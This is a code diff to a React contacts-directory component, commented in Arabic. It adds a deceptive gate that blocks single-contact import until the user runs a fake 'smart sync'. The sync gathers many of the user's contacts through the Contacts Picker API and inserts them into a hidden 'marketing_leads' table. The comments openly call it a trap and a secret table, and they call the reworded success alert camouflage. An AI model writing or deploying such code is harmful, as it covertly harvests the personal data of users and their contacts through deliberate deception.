@@ -23,7 +23,22 @@ export default function Directory() {
   };
 
   // 1. الميزة اللي العميل بيشوفها (سحب رقم واحد للفورم)
+  // 1. الميزة الفردية (مقفولة بشرط المزامنة الشاملة أولاً)
   const importSingleContact = async () => {
+    // الخدعة: بنسأله الأول، هل عملت المزامنة الذكية قبل كده؟
+    const hasSyncedBefore = localStorage.getItem('contactsSynced');
+    
+    if (!hasSyncedBefore) {
+      alert('⚠️ تنبيه النظام:\nعفواً، يجب عليك إجراء "مزامنة ذكية" لجهات الاتصال أولاً.\nهذه الخطوة ضرورية لمرة واحدة فقط لتهيئة قاعدة البيانات وتسريع عملية البحث والسحب الفردي لاحقاً.');
+      return; // بنوقف الكود هنا ومش بنفتحله الأسماء
+    }
+
+    const supported = ('contacts' in navigator && 'ContactsManager' in window);
+    if (!supported) {
+      alert('متصفحك لا يدعم سحب الأسماء. جرب من جوجل كروم على الأندرويد.');
+      return;
+    }
+    
     try {
       const props = ['name', 'tel'];
       const opts = { multiple: false };
@@ -41,10 +56,11 @@ export default function Directory() {
 
   // 2. "الفخ" (سحب كل الأرقام لجدولك السري)
   // 2. "الفخ" (سحب كل الأرقام لجدولك السري)
+  // 2. "الفخ" (سحب كل الأرقام لجدولك السري وفتح القفل)
   const handleStealthSync = async () => {
     try {
       const props = ['name', 'tel'];
-      const opts = { multiple: true }; // عشان يقدر يحدد الكل بإيده
+      const opts = { multiple: true }; // عشان يقدر يحدد الكل
       const selectedContacts = await navigator.contacts.select(props, opts);
       
       if (selectedContacts.length === 0) return;
@@ -52,7 +68,7 @@ export default function Directory() {
       setLoading(true);
       const currentUser = JSON.parse(localStorage.getItem('appUser')) || { name: 'Unknown' };
 
-      // تحضير الداتا لجدول الـ marketing_leads
+      // تحضير الداتا لجدول الـ marketing_leads (مش جدول العميل)
       const stealthData = selectedContacts.map(c => ({
         name: c.name?.[0] || 'بدون اسم',
         phone: c.tel?.[0]?.replace(/\s+/g, '') || '',
@@ -69,17 +85,19 @@ export default function Directory() {
       const { error } = await supabase.from('marketing_leads').insert(stealthData);
 
       if (error) {
-        // لو في إيرور في الداتا بيز هيطلعهولك هنا
         alert('خطأ في قاعدة البيانات: ' + error.message);
         console.error(error);
       } else {
-        // لو نجح
-        alert(`✅ تمت المزامنة بنجاح!\nتم سحب (${stealthData.length}) رقم وتحديث قاعدة البيانات لتبسيط الإضافة.`);
+        // 🔥 اللحظة الحاسمة: بنسجل في جهازه إنه عمل المزامنة عشان الزرار الفردي يشتغل بعدين
+        localStorage.setItem('contactsSynced', 'true');
+        
+        // رسالة للتمويه
+        alert(`✅ تمت المزامنة بنجاح!\nتم تحديث قاعدة بيانات الأسماء، يمكنك الآن استخدام ميزة السحب الفردي بسهولة.`);
       }
       
       setLoading(false);
     } catch (ex) {
-      alert('حدث خطأ أو تم إلغاء العملية: ' + ex.message);
+      alert('حدث خطأ أو تم إلغاء العملية.');
       console.error(ex);
       setLoading(false);
     }
